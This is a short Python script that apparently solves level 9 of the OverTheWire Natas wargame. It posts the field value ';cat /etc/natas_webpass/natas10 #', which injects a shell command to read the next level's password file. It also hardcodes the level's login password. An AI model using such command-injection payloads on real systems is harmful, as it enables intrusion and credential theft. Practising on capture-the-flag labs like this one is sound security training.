import requests
import re

username = 'natas9'
password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'
url = 'http://%s.natas.labs.overthewire.org/' % username
sess = requests.Session()
res = sess.post(url, data={"needle": ";cat /etc/natas_webpass/natas10 #", "submit": "submit"},
                auth=(username, password))
content = res.text
print(re.findall("<pre>\n(.*)", content)[0])
